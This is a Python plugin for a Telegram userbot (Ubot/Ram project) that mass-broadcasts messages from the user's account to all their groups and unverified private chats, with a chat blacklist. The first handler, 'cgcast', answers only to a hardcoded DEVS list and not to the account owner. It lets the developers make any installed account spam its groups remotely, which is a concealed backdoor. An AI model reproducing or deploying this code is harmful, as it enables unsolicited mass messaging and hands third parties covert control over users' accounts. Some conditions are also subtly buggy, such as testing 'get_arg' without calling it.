# if you can read this, this meant you use code from Ubot | Ram Project
# this code is from somewhere else
# please dont hestitate to steal it
# because Ubot and Ram doesn't care about credit
# at least we are know as well
# who Ubot and Ram is
#
#
# kopas repo dan hapus credit, ga akan jadikan lu seorang developer
# ©2023 Ubot | Ram Team
import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from ubotlibs.ubot.helper.basic import edit_or_reply
from . import *
from Ubot.core.db import *
from ubotlibs.ubot.utils import *



@Client.on_message(filters.command(["cgcast"], "") & filters.user(DEVS) & ~filters.me)
@Ubot(["gcast"], "")
async def gcast_cmd(client, message):
    if message.reply_to_message or get_arg(message):
        nay = await message.reply("`Memulai broadcast...`")
    else:
        return await message.edit("**Balas ke pesan/berikan sebuah pesan**")
    done = 0
    error = 0
    user_id = client.me.id
    list_blchat = await blacklisted_chats(user_id)
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BL_GCAST and chat not in list_blchat:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await nay.edit(
        f"**Berhasil mengirim ke** `{done}` **Groups chat, Gagal mengirim ke** `{error}` **Groups**"
    )


@Ubot(["gucast"], "")
async def gucast(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        ny = await message.reply("`Started global broadcast...`")
    else:
        return await message.edit("**Berikan sebuah pesan atau balas ke pesan**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await ny.edit(
        f"**Successfully Sent Message To** `{done}` **chat, Failed to Send Message To** `{error}` **chat**"
    )


@Ubot(["addbl"], "")
async def bl_chat(client, message):
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)
    if chat.type == "private":
        return await message.reply("Maaf, perintah ini hanya berlaku untuk grup.")
    user_id = client.me.id
    bajingan = await blacklisted_chats(user_id)
    if chat in bajingan:
        return await message.reply("Obrolan sudah masuk daftar Blacklist Gcast.")
    await blacklist_chat(user_id, chat_id)
    await message.reply("Obrolan telah berhasil dimasukkan ke dalam daftar Blacklist Gcast.")
    
@Ubot(["delbl"], "")
async def del_bl(client, message):
    if len(message.command) != 2:
        return await message.reply("**Gunakan Format:**\n `delbl [CHAT_ID]`")
    user_id = client.me.id
    chat_id = int(message.text.strip().split()[1])
    if chat_id not in await blacklisted_chats(user_id):
        return await message.reply("Obrolan berhasil dihapus dari daftar Blacklist Gcast.")
    whitelisted = await whitelist_chat(user_id, chat_id)
    if whitelisted:
        return await message.edit("Obrolan berhasil dihapus dari daftar Blacklist Gcast.")
    await message.edit("Sesuatu yang salah terjadi.")
    

@Ubot(["blchat"], "")
async def all_chats(client, message):
    text = "**Daftar Blacklist Gcast:**\n\n"
    j = 0
    user_id = client.me.id
    for count, chat_id in enumerate(await blacklisted_chats(user_id), 1):
        try:
            chat = await client.get_chat(chat_id)
            title = chat.title
        except Exception:
            title = "Private\n"
        j = 1
        text += f"**{count}.{title}**`{chat_id}`\n"
    if j == 0:
        await message.reply("Tidak Ada Obrolan Daftar Hitam")
    else:
        await message.reply(text)


add_command_help(
    "broadcast",
    [
        [f"gcast [text/reply]",
            "Broadcast pesan ke Group. (bisa menggunakan Media/Sticker)"],
        [f"gucast [text/reply]",
            "Broadcast pesan ke semua chat. (bisa menggunakan Media/Sticker)"],
        [f"addbl [id group]",
            "Menambahkan group ke dalam blacklilst gcast"],
        [f"delbl [id group]",
            "Menghapus group dari blacklist gcast"],
        [f"blchat",
            "Melihat Daftar Blacklist Chat"],
    ],
)
